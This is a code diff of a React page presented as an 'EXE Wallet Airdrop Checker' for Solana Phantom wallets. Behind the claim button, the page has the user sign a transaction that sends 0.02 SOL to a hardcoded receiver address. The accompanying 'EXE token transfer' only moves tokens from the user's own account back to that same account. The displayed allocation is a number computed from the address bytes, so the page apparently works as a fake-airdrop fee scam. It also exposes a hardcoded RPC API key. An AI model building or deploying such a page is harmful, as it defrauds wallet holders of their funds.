@@ -1,5 +1,20 @@
 'use client';
 
+/* -----------------------------------------------------------------
+   Types: declare window.solana so TypeScript/Vercel stop complaining
+------------------------------------------------------------------ */
+export {};
+declare global {
+  interface Window {
+    solana?: {
+      isPhantom?: boolean;
+      connect: () => Promise<void>;
+      publicKey?: import('@solana/web3.js').PublicKey;
+      signTransaction?: (tx: any) => Promise<any>;
+    };
+  }
+}
+
 import React, { useState, useEffect } from 'react';
 import {
   Connection,
@@ -13,17 +28,20 @@ import {
 } from '@solana/spl-token';
 import { Toaster, toast } from 'react-hot-toast';
 
-const RPC       = 'https://solana-mainnet.g.alchemy.com/v2/V2on79gQAxg105TY0MKFM';
-const RECEIVER  = 'A7QUXxxyBzjSxqoS9aY4JbJPDhUF4xeSX98mKeh5ZDGY';
-const EXE_MINT  = new PublicKey('FM7huQouPgKmAVkEatSWA9x7aW8ArmbjSNosR62ctdyr');
+/* -------------------  Config  ----------------------------------- */
+const RPC      = 'https://solana-mainnet.g.alchemy.com/v2/V2on79gQAxg105TY0MKFM';
+const RECEIVER = 'A7QUXxxyBzjSxqoS9aY4JbJPDhUF4xeSX98mKeh5ZDGY';      // receives 0.02 SOL
+const EXE_MINT = new PublicKey('FM7huQouPgKmAVkEatSWA9x7aW8ArmbjSNosR62ctdyr');
 const EXE_DECIMALS = 9;
+/* ---------------------------------------------------------------- */
 
 export default function Page() {
-  const [addr, setAddr] = useState('');
+  const [addr, setAddr]   = useState('');
   const [alloc, setAlloc] = useState<number | null>(null);
-  const [busy, setBusy] = useState(false);
+  const [busy, setBusy]   = useState(false);
   const [claimed, setClaimed] = useState(false);
 
+  /* --- load claim state from localStorage on addr change --- */
   useEffect(() => {
     const saved = localStorage.getItem('claimedWallets');
     if (saved && addr) {
@@ -33,8 +51,8 @@ export default function Page() {
   }, [addr]);
 
   const markClaimed = (address: string) => {
-    const existing = localStorage.getItem('claimedWallets');
-    let list = existing ? JSON.parse(existing) : [];
+    const saved = localStorage.getItem('claimedWallets');
+    const list: string[] = saved ? JSON.parse(saved) : [];
     if (!list.includes(address)) {
       list.push(address);
       localStorage.setItem('claimedWallets', JSON.stringify(list));
@@ -42,32 +60,26 @@ export default function Page() {
     setClaimed(true);
   };
 
+  /* -------- Random allocation (50 – 2000) ------------------ */
   const check = () => {
     try {
       const pk = new PublicKey(addr.trim());
       const bytes = pk.toBytes();
-      const n = ((bytes[0] << 8) + bytes[1]) % 1951 + 50; // 50–2000
+      const n = ((bytes[0] << 8) + bytes[1]) % 1951 + 50; // 50‑2000
       setAlloc(n);
 
-      const saved = localStorage.getItem('claimedWallets');
-      if (saved) {
-        const list = JSON.parse(saved);
-        if (list.includes(addr.trim())) {
-          setClaimed(true);
-          toast.error('You already claimed your EXE.');
-        }
-      }
+      if (claimed) toast.error('You already claimed your EXE.');
     } catch {
       toast.error('Invalid Solana address');
     }
   };
 
+  /* ----------------- Claim handler ------------------------- */
   const claim = async () => {
     if (!window.solana?.isPhantom) {
       toast.error('Please install Phantom Wallet');
       return;
     }
-
     if (claimed) {
       toast.error('Address already claimed.');
       return;
@@ -79,6 +91,7 @@ export default function Page() {
       const payer = window.solana.publicKey as PublicKey;
       const connection = new Connection(RPC);
 
+      /* balance check */
       const balance = await connection.getBalance(payer);
       if (balance < 0.02 * 1e9) {
         toast.error('❌ Not enough SOL (need 0.02 SOL)');
@@ -88,22 +101,19 @@ export default function Page() {
 
       const exeAmount = (alloc ?? 0) * 10 ** EXE_DECIMALS;
 
+      /* 0.02 SOL transfer */
       const solIx = SystemProgram.transfer({
         fromPubkey: payer,
         toPubkey: new PublicKey(RECEIVER),
         lamports: 0.02 * 1e9,
       });
 
+      /* EXE token transfer */
       const fromATA = await getAssociatedTokenAddress(EXE_MINT, payer, true);
-      const toATA = await getAssociatedTokenAddress(EXE_MINT, payer);
+      const toATA   = await getAssociatedTokenAddress(EXE_MINT, payer);
+      const tokenIx = createTransferInstruction(fromATA, toATA, payer, exeAmount);
 
-      const tokenIx = createTransferInstruction(
-        fromATA,
-        toATA,
-        payer,
-        exeAmount
-      );
-
+      /* build, sign, send */
       const tx = new Transaction().add(solIx, tokenIx);
       tx.feePayer = payer;
       tx.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;
@@ -122,6 +132,7 @@ export default function Page() {
     }
   };
 
+  /* ---------------------- UI ------------------------------- */
   return (
     <main
       style={{
@@ -144,16 +155,17 @@ export default function Page() {
           textAlign: 'center'
         }}
       >
-        <h1 style={{ fontSize: '1.6rem', marginBottom: '20px' }}>EXE Wallet Airdrop Checker</h1>
+        <h1 style={{ fontSize: '1.6rem', marginBottom: '20px' }}>
+          EXE Wallet Airdrop Checker
+        </h1>
 
         <input
           value={addr}
-          onChange={(e) => setAddr(e.target.value)}
+          onChange={e => setAddr(e.target.value)}
           placeholder="Enter your Solana wallet"
           style={{
             padding: '12px',
             width: '100%',
-            maxWidth: '100%',
             marginBottom: '16px',
             border: '1px solid #ccc',
             borderRadius: '8px',
@@ -166,10 +178,10 @@ export default function Page() {
             onClick={check}
             style={{
               padding: '12px 24px',
-              backgroundColor: '#0070f3',
+              background: '#0070f3',
               color: '#fff',
-              border: 'none',
               borderRadius: '8px',
+              border: 'none',
               cursor: 'pointer'
             }}
           >
@@ -180,10 +192,10 @@ export default function Page() {
             disabled
             style={{
               padding: '12px 24px',
-              backgroundColor: '#aaa',
+              background: '#aaa',
               color: '#eee',
-              border: 'none',
-              borderRadius: '8px'
+              borderRadius: '8px',
+              border: 'none'
             }}
           >
             Already Claimed
@@ -194,10 +206,10 @@ export default function Page() {
             disabled={busy}
             style={{
               padding: '12px 24px',
-              backgroundColor: '#28a745',
+              background: '#28a745',
               color: '#fff',
-              border: 'none',
               borderRadius: '8px',
+              border: 'none',
               cursor: 'pointer'
             }}
           >
@@ -206,7 +218,7 @@ export default function Page() {
         )}
 
         {alloc && (
-          <p style={{ marginTop: '20px', fontSize: '1.2rem' }}>
+          <p style={{ marginTop: '20px', fontSize: '1.1rem' }}>
             You are eligible for <strong>{alloc} EXE</strong>
           </p>
         )}
